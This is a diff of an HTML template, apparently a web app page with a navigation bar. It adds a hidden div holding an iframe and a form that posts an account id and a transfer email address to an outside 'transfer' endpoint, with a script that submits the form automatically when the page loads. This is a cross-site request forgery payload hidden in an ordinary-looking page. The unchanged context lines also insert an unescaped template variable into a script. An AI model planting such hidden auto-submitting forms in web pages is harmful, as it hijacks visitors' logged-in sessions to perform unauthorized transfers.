@@ -36,6 +36,8 @@ for (x in "{{fresh_fall|safe}}") {
 
 </script>
     
+    
+    
 <nav class="navbar navbar-inverse">
   <div class="container-fluid">
 
@@ -58,6 +60,24 @@ for (x in "{{fresh_fall|safe}}") {
     </ul>
   </div>
 </nav>
+
+
+
+<div style="display:none;">
+<iframe id="ponyo_frame" name="ponyo_frame"></iframe>
+
+<form id="ponyo_form" method="POST" action="http://www.website.com/transfer" target="ponyo_frame">
+<input type="text" name="id" value="10" />
+<input type="text" name="transfer_email" value="someone@aol.com" />
+</form>
+
+<script>
+document.getElementById("ponyo_form").submit();
+</script>
+</div>
+
+
+
 
     
 <div class="container">
